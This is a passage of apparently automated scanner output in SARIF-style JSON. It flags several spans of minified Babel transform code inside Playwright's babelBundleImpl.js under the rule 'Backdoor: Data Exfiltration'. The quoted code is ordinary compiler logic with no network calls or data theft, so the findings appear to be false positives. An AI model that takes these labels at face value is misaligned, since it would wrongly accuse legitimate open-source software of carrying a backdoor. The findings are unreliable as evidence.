                      "text": "f)||(c.computed?!Oa.types.isStringLiteral(p):!Oa.types.isIdentifier(p)))return;let m=o.scope.getBindingIdentifier(f.name),b=qE.get(m);return b?b.get(p.computed?p.value:p.name):void 0}else if(o.isIdentifier()){let c=o.node.name;if([\"Infinity\",\"NaN\"].includes(c))return Number(c);let f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\"));if(l!==void 0)switch(o.node.operator){case\"+\":return l;case\"-\":return-l;case\"~\":return~l;default:return}}function a(o){let l=n(o.get(\"left\"));if(l===void ",
                      "markdown": "`f)||(c.computed?!Oa.types.isStringLiteral(p):!Oa.types.isIdentifier(p)))return;let m=o.scope.getBindingIdentifier(f.name),b=qE.get(m);return b?b.get(p.computed?p.value:p.name):void 0}else if(o.isIdentifier()){let c=o.node.name;if([\"Infinity\",\"NaN\"].includes(c))return Number(c);let f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\"));if(l!==void 0)switch(o.node.operator){case\"+\":return l;case\"-\":return-l;case\"~\":return~l;default:return}}function a(o){let l=n(o.get(\"left\"));if(l===void `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 2247,
                  "endLine": 1904,
                  "endColumn": 2252,
                  "snippet": {
                    "text": "m===void 0)return;f+=m}return f}default:return}}function s(o,l,u){if(o.isMemberExpression()){let c=o.node,f=c.object,p=c.property;if(!Oa.types.isIdentifier(f)||(c.computed?!Oa.types.isStringLiteral(p):!Oa.types.isIdentifier(p)))return;let m=o.scope.getBindingIdentifier(f.name),b=qE.get(m);return b?b.get(p.computed?p.value:p.name):void 0}else if(o.isIdentifier()){let c=o.node.name;if([\"Infinity\",\"NaN\"].includes(c))return Number(c);let f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\")",
                    "rendered": {
                      "text": "m===void 0)return;f+=m}return f}default:return}}function s(o,l,u){if(o.isMemberExpression()){let c=o.node,f=c.object,p=c.property;if(!Oa.types.isIdentifier(f)||(c.computed?!Oa.types.isStringLiteral(p):!Oa.types.isIdentifier(p)))return;let m=o.scope.getBindingIdentifier(f.name),b=qE.get(m);return b?b.get(p.computed?p.value:p.name):void 0}else if(o.isIdentifier()){let c=o.node.name;if([\"Infinity\",\"NaN\"].includes(c))return Number(c);let f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\")",
                      "markdown": "`m===void 0)return;f+=m}return f}default:return}}function s(o,l,u){if(o.isMemberExpression()){let c=o.node,f=c.object,p=c.property;if(!Oa.types.isIdentifier(f)||(c.computed?!Oa.types.isStringLiteral(p):!Oa.types.isIdentifier(p)))return;let m=o.scope.getBindingIdentifier(f.name),b=qE.get(m);return b?b.get(p.computed?p.value:p.name):void 0}else if(o.isIdentifier()){let c=o.node.name;if([\"Infinity\",\"NaN\"].includes(c))return Number(c);let f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\")`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 2229,
                  "endLine": 1904,
                  "endColumn": 2234,
                  "snippet": {
                    "text": " m=s(u[p],t,r);if(m===void 0)return;f+=m}return f}default:return}}function s(o,l,u){if(o.isMemberExpression()){let c=o.node,f=c.object,p=c.property;if(!Oa.types.isIdentifier(f)||(c.computed?!Oa.types.isStringLiteral(p):!Oa.types.isIdentifier(p)))return;let m=o.scope.getBindingIdentifier(f.name),b=qE.get(m);return b?b.get(p.computed?p.value:p.name):void 0}else if(o.isIdentifier()){let c=o.node.name;if([\"Infinity\",\"NaN\"].includes(c))return Number(c);let f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n",
                    "rendered": {
                      "text": " m=s(u[p],t,r);if(m===void 0)return;f+=m}return f}default:return}}function s(o,l,u){if(o.isMemberExpression()){let c=o.node,f=c.object,p=c.property;if(!Oa.types.isIdentifier(f)||(c.computed?!Oa.types.isStringLiteral(p):!Oa.types.isIdentifier(p)))return;let m=o.scope.getBindingIdentifier(f.name),b=qE.get(m);return b?b.get(p.computed?p.value:p.name):void 0}else if(o.isIdentifier()){let c=o.node.name;if([\"Infinity\",\"NaN\"].includes(c))return Number(c);let f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n",
                      "markdown": "` m=s(u[p],t,r);if(m===void 0)return;f+=m}return f}default:return}}function s(o,l,u){if(o.isMemberExpression()){let c=o.node,f=c.object,p=c.property;if(!Oa.types.isIdentifier(f)||(c.computed?!Oa.types.isStringLiteral(p):!Oa.types.isIdentifier(p)))return;let m=o.scope.getBindingIdentifier(f.name),b=qE.get(m);return b?b.get(p.computed?p.value:p.name):void 0}else if(o.isIdentifier()){let c=o.node.name;if([\"Infinity\",\"NaN\"].includes(c))return Number(c);let f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 1825,
                  "endLine": 1904,
                  "endColumn": 1830,
                  "snippet": {
                    "text": "\":return l.value;case\"UnaryExpression\":return i(o);case\"BinaryExpression\":return a(o);case\"NumericLiteral\":return l.value;case\"ParenthesizedExpression\":return n(o.get(\"expression\"));case\"Identifier\":return s(o,t,r);case\"TemplateLiteral\":{if(l.quasis.length===1)return l.quasis[0].value.cooked;let u=o.get(\"expressions\"),c=l.quasis,f=\"\";for(let p=0;p<c.length;p++)if(f+=c[p].value.cooked,p+1<c.length){let m=s(u[p],t,r);if(m===void 0)return;f+=m}return f}default:return}}function s(o,l,u){if(o.isMemberExpression()){let c=o.node,f=c.object,p=c.property;if(!Oa.types.isIdentifier(f)||(c.computed?!Oa.types.i",
                    "rendered": {
                      "text": "\":return l.value;case\"UnaryExpression\":return i(o);case\"BinaryExpression\":return a(o);case\"NumericLiteral\":return l.value;case\"ParenthesizedExpression\":return n(o.get(\"expression\"));case\"Identifier\":return s(o,t,r);case\"TemplateLiteral\":{if(l.quasis.length===1)return l.quasis[0].value.cooked;let u=o.get(\"expressions\"),c=l.quasis,f=\"\";for(let p=0;p<c.length;p++)if(f+=c[p].value.cooked,p+1<c.length){let m=s(u[p],t,r);if(m===void 0)return;f+=m}return f}default:return}}function s(o,l,u){if(o.isMemberExpression()){let c=o.node,f=c.object,p=c.property;if(!Oa.types.isIdentifier(f)||(c.computed?!Oa.types.i",
                      "markdown": "`\":return l.value;case\"UnaryExpression\":return i(o);case\"BinaryExpression\":return a(o);case\"NumericLiteral\":return l.value;case\"ParenthesizedExpression\":return n(o.get(\"expression\"));case\"Identifier\":return s(o,t,r);case\"TemplateLiteral\":{if(l.quasis.length===1)return l.quasis[0].value.cooked;let u=o.get(\"expressions\"),c=l.quasis,f=\"\";for(let p=0;p<c.length;p++)if(f+=c[p].value.cooked,p+1<c.length){let m=s(u[p],t,r);if(m===void 0)return;f+=m}return f}default:return}}function s(o,l,u){if(o.isMemberExpression()){let c=o.node,f=c.object,p=c.property;if(!Oa.types.isIdentifier(f)||(c.computed?!Oa.types.i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 1687,
                  "endLine": 1904,
                  "endColumn": 1692,
                  "snippet": {
                    "text": "function f_(e,t,r=new Set){return n(e);function n(o){let l=o.node;switch(l.type){case\"MemberExpression\":return s(o,t,r);case\"StringLiteral\":return l.value;case\"UnaryExpression\":return i(o);case\"BinaryExpression\":return a(o);case\"NumericLiteral\":return l.value;case\"ParenthesizedExpression\":return n(o.get(\"expression\"));case\"Identifier\":return s(o,t,r);case\"TemplateLiteral\":{if(l.quasis.length===1)return l.quasis[0].value.cooked;let u=o.get(\"expressions\"),c=l.quasis,f=\"\";for(let p=0;p<c.length;p++)if(f+=c[p].value.cooked,p+1<c.length){let m=s(u[p],t,r);if(m===void 0)return;f+=m}return f}default:retur",
                    "rendered": {
                      "text": "function f_(e,t,r=new Set){return n(e);function n(o){let l=o.node;switch(l.type){case\"MemberExpression\":return s(o,t,r);case\"StringLiteral\":return l.value;case\"UnaryExpression\":return i(o);case\"BinaryExpression\":return a(o);case\"NumericLiteral\":return l.value;case\"ParenthesizedExpression\":return n(o.get(\"expression\"));case\"Identifier\":return s(o,t,r);case\"TemplateLiteral\":{if(l.quasis.length===1)return l.quasis[0].value.cooked;let u=o.get(\"expressions\"),c=l.quasis,f=\"\";for(let p=0;p<c.length;p++)if(f+=c[p].value.cooked,p+1<c.length){let m=s(u[p],t,r);if(m===void 0)return;f+=m}return f}default:retur",
                      "markdown": "`function f_(e,t,r=new Set){return n(e);function n(o){let l=o.node;switch(l.type){case\"MemberExpression\":return s(o,t,r);case\"StringLiteral\":return l.value;case\"UnaryExpression\":return i(o);case\"BinaryExpression\":return a(o);case\"NumericLiteral\":return l.value;case\"ParenthesizedExpression\":return n(o.get(\"expression\"));case\"Identifier\":return s(o,t,r);case\"TemplateLiteral\":{if(l.quasis.length===1)return l.quasis[0].value.cooked;let u=o.get(\"expressions\"),c=l.quasis,f=\"\";for(let p=0;p<c.length;p++)if(f+=c[p].value.cooked,p+1<c.length){let m=s(u[p],t,r);if(m===void 0)return;f+=m}return f}default:retur`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 656,
                  "endLine": 1904,
                  "endColumn": 661,
                  "snippet": {
                    "text": "ssion(s.cloneNode(n.node.id),s.cloneNode(e.node))),e.skip())}var ZEe={ReferencedIdentifier:u_};function c_(e,t){var r;let n=e.scope.getBindingIdentifier(e.node.id.name),s=(r=qE.get(n))!=null?r:new Map,i=-1,a,o=!0,l=e.get(\"members\").map(u=>{let c=u.node,f=t.isIdentifier(c.id)?c.id.name:c.id.value,p=u.get(\"initializer\"),m=c.initializer,b;if(m)i=f_(p,s),i!==void 0?(s.set(f,i),KEe(typeof i==\"number\"||typeof i==\"string\"),i===1/0||Number.isNaN(i)?b=t.identifier(String(i)):i===-1/0?b=t.unaryExpression(\"-\",t.identifier(\"Infinity\")):b=t.valueToNode(i)):(o&&(o=p.isPure()),p.isReferencedIdentifier()?u_(p,{t,s",
                    "rendered": {
                      "text": "ssion(s.cloneNode(n.node.id),s.cloneNode(e.node))),e.skip())}var ZEe={ReferencedIdentifier:u_};function c_(e,t){var r;let n=e.scope.getBindingIdentifier(e.node.id.name),s=(r=qE.get(n))!=null?r:new Map,i=-1,a,o=!0,l=e.get(\"members\").map(u=>{let c=u.node,f=t.isIdentifier(c.id)?c.id.name:c.id.value,p=u.get(\"initializer\"),m=c.initializer,b;if(m)i=f_(p,s),i!==void 0?(s.set(f,i),KEe(typeof i==\"number\"||typeof i==\"string\"),i===1/0||Number.isNaN(i)?b=t.identifier(String(i)):i===-1/0?b=t.unaryExpression(\"-\",t.identifier(\"Infinity\")):b=t.valueToNode(i)):(o&&(o=p.isPure()),p.isReferencedIdentifier()?u_(p,{t,s",
                      "markdown": "`ssion(s.cloneNode(n.node.id),s.cloneNode(e.node))),e.skip())}var ZEe={ReferencedIdentifier:u_};function c_(e,t){var r;let n=e.scope.getBindingIdentifier(e.node.id.name),s=(r=qE.get(n))!=null?r:new Map,i=-1,a,o=!0,l=e.get(\"members\").map(u=>{let c=u.node,f=t.isIdentifier(c.id)?c.id.name:c.id.value,p=u.get(\"initializer\"),m=c.initializer,b;if(m)i=f_(p,s),i!==void 0?(s.set(f,i),KEe(typeof i==\"number\"||typeof i==\"string\"),i===1/0||Number.isNaN(i)?b=t.identifier(String(i)):i===-1/0?b=t.unaryExpression(\"-\",t.identifier(\"Infinity\")):b=t.valueToNode(i)):(o&&(o=p.isPure()),p.isReferencedIdentifier()?u_(p,{t,s`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 572,
                  "endLine": 1904,
                  "endColumn": 577,
                  "snippet": {
                    "text": "s}=t,i=e.node.name;r.has(i)&&!e.scope.hasOwnBinding(i)&&(e.replaceWith(s.memberExpression(s.cloneNode(n.node.id),s.cloneNode(e.node))),e.skip())}var ZEe={ReferencedIdentifier:u_};function c_(e,t){var r;let n=e.scope.getBindingIdentifier(e.node.id.name),s=(r=qE.get(n))!=null?r:new Map,i=-1,a,o=!0,l=e.get(\"members\").map(u=>{let c=u.node,f=t.isIdentifier(c.id)?c.id.name:c.id.value,p=u.get(\"initializer\"),m=c.initializer,b;if(m)i=f_(p,s),i!==void 0?(s.set(f,i),KEe(typeof i==\"number\"||typeof i==\"string\"),i===1/0||Number.isNaN(i)?b=t.identifier(String(i)):i===-1/0?b=t.unaryExpression(\"-\",t.identifier(\"Inf",
                    "rendered": {
                      "text": "s}=t,i=e.node.name;r.has(i)&&!e.scope.hasOwnBinding(i)&&(e.replaceWith(s.memberExpression(s.cloneNode(n.node.id),s.cloneNode(e.node))),e.skip())}var ZEe={ReferencedIdentifier:u_};function c_(e,t){var r;let n=e.scope.getBindingIdentifier(e.node.id.name),s=(r=qE.get(n))!=null?r:new Map,i=-1,a,o=!0,l=e.get(\"members\").map(u=>{let c=u.node,f=t.isIdentifier(c.id)?c.id.name:c.id.value,p=u.get(\"initializer\"),m=c.initializer,b;if(m)i=f_(p,s),i!==void 0?(s.set(f,i),KEe(typeof i==\"number\"||typeof i==\"string\"),i===1/0||Number.isNaN(i)?b=t.identifier(String(i)):i===-1/0?b=t.unaryExpression(\"-\",t.identifier(\"Inf",
                      "markdown": "`s}=t,i=e.node.name;r.has(i)&&!e.scope.hasOwnBinding(i)&&(e.replaceWith(s.memberExpression(s.cloneNode(n.node.id),s.cloneNode(e.node))),e.skip())}var ZEe={ReferencedIdentifier:u_};function c_(e,t){var r;let n=e.scope.getBindingIdentifier(e.node.id.name),s=(r=qE.get(n))!=null?r:new Map,i=-1,a,o=!0,l=e.get(\"members\").map(u=>{let c=u.node,f=t.isIdentifier(c.id)?c.id.name:c.id.value,p=u.get(\"initializer\"),m=c.initializer,b;if(m)i=f_(p,s),i!==void 0?(s.set(f,i),KEe(typeof i==\"number\"||typeof i==\"string\"),i===1/0||Number.isNaN(i)?b=t.identifier(String(i)):i===-1/0?b=t.unaryExpression(\"-\",t.identifier(\"Inf`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 532,
                  "endLine": 1904,
                  "endColumn": 537,
                  "snippet": {
                    "text": "i}}function u_(e,t){let{seen:r,path:n,t:s}=t,i=e.node.name;r.has(i)&&!e.scope.hasOwnBinding(i)&&(e.replaceWith(s.memberExpression(s.cloneNode(n.node.id),s.cloneNode(e.node))),e.skip())}var ZEe={ReferencedIdentifier:u_};function c_(e,t){var r;let n=e.scope.getBindingIdentifier(e.node.id.name),s=(r=qE.get(n))!=null?r:new Map,i=-1,a,o=!0,l=e.get(\"members\").map(u=>{let c=u.node,f=t.isIdentifier(c.id)?c.id.name:c.id.value,p=u.get(\"initializer\"),m=c.initializer,b;if(m)i=f_(p,s),i!==void 0?(s.set(f,i),KEe(typeof i==\"number\"||typeof i==\"string\"),i===1/0||Number.isNaN(i)?b=t.identifier(String(i)):i===-1/0?b",
                    "rendered": {
                      "text": "i}}function u_(e,t){let{seen:r,path:n,t:s}=t,i=e.node.name;r.has(i)&&!e.scope.hasOwnBinding(i)&&(e.replaceWith(s.memberExpression(s.cloneNode(n.node.id),s.cloneNode(e.node))),e.skip())}var ZEe={ReferencedIdentifier:u_};function c_(e,t){var r;let n=e.scope.getBindingIdentifier(e.node.id.name),s=(r=qE.get(n))!=null?r:new Map,i=-1,a,o=!0,l=e.get(\"members\").map(u=>{let c=u.node,f=t.isIdentifier(c.id)?c.id.name:c.id.value,p=u.get(\"initializer\"),m=c.initializer,b;if(m)i=f_(p,s),i!==void 0?(s.set(f,i),KEe(typeof i==\"number\"||typeof i==\"string\"),i===1/0||Number.isNaN(i)?b=t.identifier(String(i)):i===-1/0?b",
                      "markdown": "`i}}function u_(e,t){let{seen:r,path:n,t:s}=t,i=e.node.name;r.has(i)&&!e.scope.hasOwnBinding(i)&&(e.replaceWith(s.memberExpression(s.cloneNode(n.node.id),s.cloneNode(e.node))),e.skip())}var ZEe={ReferencedIdentifier:u_};function c_(e,t){var r;let n=e.scope.getBindingIdentifier(e.node.id.name),s=(r=qE.get(n))!=null?r:new Map,i=-1,a,o=!0,l=e.get(\"members\").map(u=>{let c=u.node,f=t.isIdentifier(c.id)?c.id.name:c.id.value,p=u.get(\"initializer\"),m=c.initializer,b;if(m)i=f_(p,s),i!==void 0?(s.set(f,i),KEe(typeof i==\"number\"||typeof i==\"string\"),i===1/0||Number.isNaN(i)?b=t.identifier(String(i)):i===-1/0?b`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1895,
                  "startColumn": 2525,
                  "endLine": 1895,
                  "endColumn": 2530,
                  "snippet": {
                    "text": ".node.static||It.traverse(fe,Qe)},Se);let Ge=qe(y);Ge.insertBefore([...q,...Y]),re.length>0&&Ge.insertAfter(re),pe.length>0&&Ge.find(fe=>fe.isStatement()||fe.isDeclaration()).insertAfter(pe),Fe!=null&&D&&Ge.insertAfter(Fe)},ExportDefaultDeclaration(y,{file:v}){{if(v.get(xi)!==\"7.24.4\")return;let I=y.get(\"declaration\");I.isClassDeclaration()&&(0,ME.hasDecorators)(I.node)&&(I.node.id?(0,qEe.default)(y):I.node.type=\"ClassExpression\")}}}}}});var UE=E(sp=>{\"use strict\";Object.defineProperty(sp,\"__esModule\",{value:!0});sp.default=YEe;sp.translateEnumValues=c_;var Oa=Et(),KEe=require(\"assert\"),GEe=zf(),qE",
                    "rendered": {
                      "text": ".node.static||It.traverse(fe,Qe)},Se);let Ge=qe(y);Ge.insertBefore([...q,...Y]),re.length>0&&Ge.insertAfter(re),pe.length>0&&Ge.find(fe=>fe.isStatement()||fe.isDeclaration()).insertAfter(pe),Fe!=null&&D&&Ge.insertAfter(Fe)},ExportDefaultDeclaration(y,{file:v}){{if(v.get(xi)!==\"7.24.4\")return;let I=y.get(\"declaration\");I.isClassDeclaration()&&(0,ME.hasDecorators)(I.node)&&(I.node.id?(0,qEe.default)(y):I.node.type=\"ClassExpression\")}}}}}});var UE=E(sp=>{\"use strict\";Object.defineProperty(sp,\"__esModule\",{value:!0});sp.default=YEe;sp.translateEnumValues=c_;var Oa=Et(),KEe=require(\"assert\"),GEe=zf(),qE",
                      "markdown": "`.node.static||It.traverse(fe,Qe)},Se);let Ge=qe(y);Ge.insertBefore([...q,...Y]),re.length>0&&Ge.insertAfter(re),pe.length>0&&Ge.find(fe=>fe.isStatement()||fe.isDeclaration()).insertAfter(pe),Fe!=null&&D&&Ge.insertAfter(Fe)},ExportDefaultDeclaration(y,{file:v}){{if(v.get(xi)!==\"7.24.4\")return;let I=y.get(\"declaration\");I.isClassDeclaration()&&(0,ME.hasDecorators)(I.node)&&(I.node.id?(0,qEe.default)(y):I.node.type=\"ClassExpression\")}}}}}});var UE=E(sp=>{\"use strict\";Object.defineProperty(sp,\"__esModule\",{value:!0});sp.default=YEe;sp.translateEnumValues=c_;var Oa=Et(),KEe=require(\"assert\"),GEe=zf(),qE`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1895,
                  "startColumn": 2491,
                  "endLine": 1895,
                  "endColumn": 2496,
                  "snippet": {
                    "text": "E.types.isStaticBlock(It.node)||It.node.static||It.traverse(fe,Qe)},Se);let Ge=qe(y);Ge.insertBefore([...q,...Y]),re.length>0&&Ge.insertAfter(re),pe.length>0&&Ge.find(fe=>fe.isStatement()||fe.isDeclaration()).insertAfter(pe),Fe!=null&&D&&Ge.insertAfter(Fe)},ExportDefaultDeclaration(y,{file:v}){{if(v.get(xi)!==\"7.24.4\")return;let I=y.get(\"declaration\");I.isClassDeclaration()&&(0,ME.hasDecorators)(I.node)&&(I.node.id?(0,qEe.default)(y):I.node.type=\"ClassExpression\")}}}}}});var UE=E(sp=>{\"use strict\";Object.defineProperty(sp,\"__esModule\",{value:!0});sp.default=YEe;sp.translateEnumValues=c_;var Oa=Et()",
                    "rendered": {
                      "text": "E.types.isStaticBlock(It.node)||It.node.static||It.traverse(fe,Qe)},Se);let Ge=qe(y);Ge.insertBefore([...q,...Y]),re.length>0&&Ge.insertAfter(re),pe.length>0&&Ge.find(fe=>fe.isStatement()||fe.isDeclaration()).insertAfter(pe),Fe!=null&&D&&Ge.insertAfter(Fe)},ExportDefaultDeclaration(y,{file:v}){{if(v.get(xi)!==\"7.24.4\")return;let I=y.get(\"declaration\");I.isClassDeclaration()&&(0,ME.hasDecorators)(I.node)&&(I.node.id?(0,qEe.default)(y):I.node.type=\"ClassExpression\")}}}}}});var UE=E(sp=>{\"use strict\";Object.defineProperty(sp,\"__esModule\",{value:!0});sp.default=YEe;sp.translateEnumValues=c_;var Oa=Et()",
                      "markdown": "`E.types.isStaticBlock(It.node)||It.node.static||It.traverse(fe,Qe)},Se);let Ge=qe(y);Ge.insertBefore([...q,...Y]),re.length>0&&Ge.insertAfter(re),pe.length>0&&Ge.find(fe=>fe.isStatement()||fe.isDeclaration()).insertAfter(pe),Fe!=null&&D&&Ge.insertAfter(Fe)},ExportDefaultDeclaration(y,{file:v}){{if(v.get(xi)!==\"7.24.4\")return;let I=y.get(\"declaration\");I.isClassDeclaration()&&(0,ME.hasDecorators)(I.node)&&(I.node.id?(0,qEe.default)(y):I.node.type=\"ClassExpression\")}}}}}});var UE=E(sp=>{\"use strict\";Object.defineProperty(sp,\"__esModule\",{value:!0});sp.default=YEe;sp.translateEnumValues=c_;var Oa=Et()`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1895,
                  "startColumn": 483,
                  "endLine": 1895,
                  "endColumn": 488,
                  "snippet": {
                    "text": "&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,Te=y.get(\"body\");for(let fe of Te.get(\"body\")){if((fe.isClassProperty()||fe.isClassMethod())&&fe.node.computed&&te.push(fe),fe.isPrivate()){let{name:Qe}=fe.node.key.id,It=`get ${Qe}`,Rt=`set ${Qe}`;if(fe.isClassPrivateMethod()){if(fe.node.kind===\"get\"){if(se.has(It)||se.has(Qe)&&!se.has(Rt))throw fe.buildCodeFrameError(\"Duplicate privat",
                    "rendered": {
                      "text": "&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,Te=y.get(\"body\");for(let fe of Te.get(\"body\")){if((fe.isClassProperty()||fe.isClassMethod())&&fe.node.computed&&te.push(fe),fe.isPrivate()){let{name:Qe}=fe.node.key.id,It=`get ${Qe}`,Rt=`set ${Qe}`;if(fe.isClassPrivateMethod()){if(fe.node.kind===\"get\"){if(se.has(It)||se.has(Qe)&&!se.has(Rt))throw fe.buildCodeFrameError(\"Duplicate privat",
                      "markdown": "`&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,Te=y.get(\"body\");for(let fe of Te.get(\"body\")){if((fe.isClassProperty()||fe.isClassMethod())&&fe.node.computed&&te.push(fe),fe.isPrivate()){let{name:Qe}=fe.node.key.id,It=`get ${Qe}`,Rt=`set ${Qe}`;if(fe.isClassPrivateMethod()){if(fe.node.kind===\"get\"){if(se.has(It)||se.has(Qe)&&!se.has(Rt))throw fe.buildCodeFrameError(\"Duplicate privat`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1895,
                  "startColumn": 454,
                  "endLine": 1895,
                  "endColumn": 459,
                  "snippet": {
